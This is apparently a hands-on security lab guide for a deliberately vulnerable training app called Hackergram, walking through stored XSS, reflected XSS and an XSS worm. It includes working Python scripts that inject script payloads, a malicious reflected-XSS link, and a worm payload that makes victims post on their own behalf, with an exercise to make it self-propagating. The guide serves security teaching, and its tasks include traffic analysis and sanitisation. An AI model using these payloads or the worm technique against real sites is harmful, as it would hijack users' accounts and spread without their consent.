# Cross-Site Scripting

## Stored XSS

In this attack, the attacker writes a post that contains JavaScript code (which gets stored in Hackergram’s database). When users see the post the victim-browser executes the code. The procedure is the following:

1.	Create a file with the following Python script at the attacker:

``` py
import requests
import sys

def reset(session):
    session.get(SERVER+"/reset")

def register(session):
    payload = {
        'username': "mallory",
        'name': "Mallory",
        'password': "eve123"
    }
    session.post(SERVER+"/signup", data=payload)

def login(session):
    payload = {
        'username': "mallory",
        'password': "eve123"
    }
    session.post(SERVER+"/login", data=payload)

def exploit(session):
    payload = {
        'content': "<script>alert(\"XSS\")</script>",
    }
    r = session.post(SERVER+"/create_post", data=payload)
    print(r)

if __name__ == '__main__':
    host = '192.168.0.100' if len(sys.argv) < 2 else sys.argv[1]
    port = '80' if len(sys.argv) < 3 else sys.argv[2]
    SERVER = "http://" + host + ":" + port
    print(SERVER)
    with requests.session() as s:
        reset(s)
        register(s)
        login(s)
        exploit(s)
```
        
The script first makes a request to the /reset endpoint to force a clean state on Hackergram and then registers and logs in the @mallory user. Lastly, it makes a request to the /create_post endpoint, creating a new post with the content: ```<script>alert("XSS")</script>```. This post is going to be stored in Hackergram’s database.

2.	Install a Wireshark probe at the Hackergram interface.
3.	Run the script at the attacker.
4.	Login to Hackergram (e.g., as ```mr_robot```) and check that the victim-browser runs the JavaScript code when visiting either Mallory’s profile page or Hackergram’s homepage. In this case, a pop-up box with the message XSS must be displayed.
5.	Analyze the traffic exchanged by Hackergram using an http filter. Identify the HTTP message that injects the JavaScript code in Hackergram and the one that transfers it to the victim-browser.

Additional exercises: The /settings endpoint is also vulnerable to this attack type. Find a way of using the photo field to attack this endpoint.

## Reflected XSS

In this attack, the attacker tricks the victim into clicking a malicious link which results in a JavaScript code being executed in the victim-browser, hence the name reflected XSS. The vulnerable endpoint that will be exploited is /users, which allows searching for users by providing a search string. The string is passed to Hackergram as an argument (called search) of a GET Request. The procedure is the following:

1.	Install a Wireshark probe at the Hackergram interface.
2.	In the victim-browser enter:
```http://192.168.0.100/users?search=<script>alert%28"XSS"%29<%2Fscript>```
Note that ```%28``` and ```%29``` encode the ```(``` and ```)``` characters, and ```%2F``` encode the ```/``` character.
3.	Check that a pop-up box with the message XSS must be displayed.
4.	Analyze the traffic exchanged by Hackergram using an ```http``` filter. Identify the HTTP message that sends the JavaScript code to Hackergram and the one where it is reflected to the victim-browser.

Additional exercises:

1.	Hackergram has another endpoint vulnerable to this attack. Discover it and perform the attack.
2.	Using the bleach library, sanitize the ```/users``` endpoint so that the attack is no longer possible.

##	XSS worm

In this attack you will create an XSS worm using the posts feature, which leverages the DOM of the page. The following code makes the victim create a post with the content “Mallory hacked me”.

``` py
# XSS virus in New Post form

import requests
import sys

def reset(session):
    session.get(SERVER+"/reset")

def register(session):
    payload = {
        'username': "mallory",
        'name': "Mallory",
        'password': "eve123"
    }
    session.post(SERVER+"/signup", data=payload)

def login(session):
    payload = {
        'username': "mallory",
        'password': "eve123"
    }
    session.post(SERVER+"/login", data=payload)

def exploit(session):
    data = (
        '<script type="text/javascript" id="virus">\n'
        'window.onload = function(){{\n'
        'var url = "{}/create_post";\n'
        'var params = "&content=Mallory hacked me" + "" + "";\n'
        'var http = new XMLHttpRequest();\n'
        'var a = document.getElementById("user").outerHTML.search("mallory");\n'
        'if (a < 0) {{\n'
        'http.open("POST", url, true);\n'
        'http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");\n'
        'http.onreadystatechange = function() {{\n'
        'if(http.readyState == 4 && http.status == 200) {{\n'
        '}}\n'
        '}}\n'
        'http.send(params);\n'
        '}}\n'
        '}}\n'
        '</script>\n'
    ).format(SERVER)
    payload = {
        'content': data,
    }
    r = session.post(SERVER+"/create_post", data=payload)
    print(r)

if __name__ == '__main__':
    host = '192.168.0.100' if len(sys.argv) < 2 else sys.argv[1]
    port = '80' if len(sys.argv) < 3 else sys.argv[2]
    SERVER = "http://" + host + ":" + port
    print(SERVER)
    with requests.session() as s:
        reset(s)
        register(s)
        login(s)
        exploit(s)
```

Do the following:

1. Run the script on the attacker.
2. Login as mr_robot and check that a post has been created on behalf of ```mr_robot``` with the content “Mallory hacked me”. Check that a new post is created when reloading Hackergram’s homepage or any other page that displays posts.
3. Repeat the procedure for other users.

Now, modify the script so that the attack turns into a true XSS worm, i.e., so that it achieves self-propagation.